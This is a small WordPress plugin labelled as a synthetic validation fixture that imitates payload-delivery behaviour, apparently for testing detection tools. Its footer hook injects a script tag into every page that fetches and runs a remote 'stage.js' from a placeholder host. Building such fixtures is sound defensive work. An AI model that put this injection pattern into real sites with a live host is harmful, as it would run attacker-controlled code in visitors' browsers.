<?php
/**
 * Plugin Name: Synthetic Payload Delivery
 * Description: Validation fixture — emulates Payload Delivery behavioral signals.
 */
if (!defined('ABSPATH')) {
    exit;
}

add_action('wp_enqueue_scripts', function () {
    wp_register_script('synth-pd-loader', plugin_dir_url(__FILE__) . 'loader.js', array(), '1.0', true);
    wp_enqueue_script('synth-pd-loader');
    wp_add_inline_script('synth-pd-loader', 'var _synth = window._synth || {};');
});

add_action('wp_footer', function () {
    echo "<script>var el = document.createElement('script'); el.src = 'https://example-fixture.invalid/stage.js'; document.head.appendChild(el);</script>";
});
